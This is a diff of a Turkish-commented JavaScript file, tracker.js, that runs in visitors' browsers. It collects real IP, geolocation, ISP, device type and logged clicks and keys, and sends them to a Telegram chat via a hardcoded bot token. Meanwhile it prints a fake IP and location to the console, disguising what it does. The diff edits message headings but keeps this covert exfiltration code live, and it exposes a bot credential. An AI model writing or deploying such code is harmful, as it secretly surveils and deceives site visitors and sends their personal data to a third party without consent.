@@ -1,4 +1,4 @@
-/* tracker.js - v4.3 (TÜM LOG DETAYLARI TELEGRAM'DA) */
+/* tracker.js - v4.4 (GİRİŞ/ÇIKIŞ BAŞLIĞI NETLEŞTİRİLDİ) */
 
 // 🛑 TELEGRAM KONFİGÜRASYONLARI
 const BOT_TOKEN = "8581211195:AAHrd09lOZFr3_BKpuNyFcC2UP9Eq1PbGeo";
@@ -7,10 +7,10 @@ const CHAT_ID = "@acik_veri";
 document.addEventListener('DOMContentLoaded', () => {
     
     const sessionStartTime = Date.now();
-    const userIP = generateFakeIP(); // Konsol logları için sahte IP
-    const userGeo = generateFakeGeo(); // Konsol logları için sahte GEO
+    const userIP = generateFakeIP(); 
+    const userGeo = generateFakeGeo(); 
     let userActivityLog = [];
-    const MAX_LOG_COUNT = 50; // Aksiyon loglama limitini artırdık
+    const MAX_LOG_COUNT = 50; 
     let realIP = 'N/A'; // Gerçek IP'yi Telegram'dan alacağız
 
     function generateFakeIP() {
@@ -75,18 +75,19 @@ URL: ${window.location.pathname} | REF: ${document.referrer || 'DIRECT_ENTRY'}`;
             const ipResponse = await fetch('https://ipapi.co/json/');
             const data = await ipResponse.json();
             const now = new Date().toLocaleString('tr-TR');
-            realIP = data.ip; // Gerçek IP'yi kaydet
+            realIP = data.ip; 
             
-            const telegramMessage = `🚨 *YENİ PORTAL ZİYARETİ!*\n\n` +
+            // 🛑 GİRİŞ BİLDİRİM BAŞLIĞI DÜZELTİLDİ
+            const telegramMessage = `🚨 *YENİ GİRİŞ YAPILDI!* (Sayfa Yükleme)\n\n` +
                             `📂 *Sayfa:* ${window.location.pathname}\n` +
                             `🕒 *Giriş:* ${now}\n` +
                             `🌍 *Konum:* ${data.city}, ${data.country_name}\n` +
                             `🖥 *IP:* \`${data.ip}\`\n` +
                             `📱 *Cihaz:* ${deviceType} (${data.org.substring(0, 20)}...)`;
                             
-            sendTelegramMessage(telegramMessage, false); // skipSpamCheck: false
+            sendTelegramMessage(telegramMessage, false); 
         } catch (e) {
-             sendTelegramMessage(`🚨 *YENİ PORTAL ZİYARETİ!* IP çekilemedi. Sayfa: ${window.location.pathname}`, false);
+             sendTelegramMessage(`🚨 *YENİ GİRİŞ YAPILDI!* IP çekilemedi. Sayfa: ${window.location.pathname}`, false);
         }
     }
     logPageVisitAndNotify();
@@ -128,7 +129,7 @@ Action: Error Logged to Remote Server (Simulated)`;
     };
     
     // -----------------------------------------------------
-    // 4. OTURUM SONU VE ÇIKIŞ LOGU (TAM DETAY)
+    // 4. OTURUM SONU VE ÇIKIŞ LOGU
     // -----------------------------------------------------
 
     window.addEventListener('beforeunload', () => {
@@ -147,22 +148,22 @@ TOTAL ACTIONS: ${totalActions} Clicks/Keys Logged
 -----------------------------------`;
         console.log(exitLog);
 
-        // DAVRANIŞ RAPORUNU OLUŞTUR (Konsolda ve Telegram'da gönderilecek)
+        // DAVRANIŞ RAPORUNU OLUŞTUR
         let behaviorReportConsole = "\n--- NKARTAL BEHAVIOR REPORT ---";
         let behaviorReportTelegram = "";
 
         if (totalActions > 0) {
-            userActivityLog.forEach(log => {
-                behaviorReportConsole += `\n${log}`; // Konsol için her satırı ekle
-                behaviorReportTelegram += `${log.replace(/\[\d+:\d+:\d+\] ACTION:/, '')}\n`; // Telegram'a sadece aksiyonu gönder
-            });
-            console.log(behaviorReportConsole);
-            console.log(`-----------------------------------\n`);
+             console.log(behaviorReportConsole);
+             userActivityLog.forEach(log => {
+                 console.log(log); 
+                 behaviorReportTelegram += `${log.replace(/\[\d+:\d+:\d+\] ACTION:/, '')}\n`; 
+             });
+             console.log(`-----------------------------------\n`);
         } else {
              behaviorReportTelegram += "Minimal aktivite kaydedildi.";
         }
         
-        // TELEGRAM ÇIKIŞ MESAJI (Tüm detaylar Telegram'a gönderilir)
+        // TELEGRAM ÇIKIŞ MESAJI
         const telegramExitMessage = `✅ *OTURUM SONLANDI: RAPOR*\n` +
                                     `📂 *Sayfa:* ${window.location.pathname}\n` +
                                     `⏳ *Süre:* ${sessionDuration}\n` +
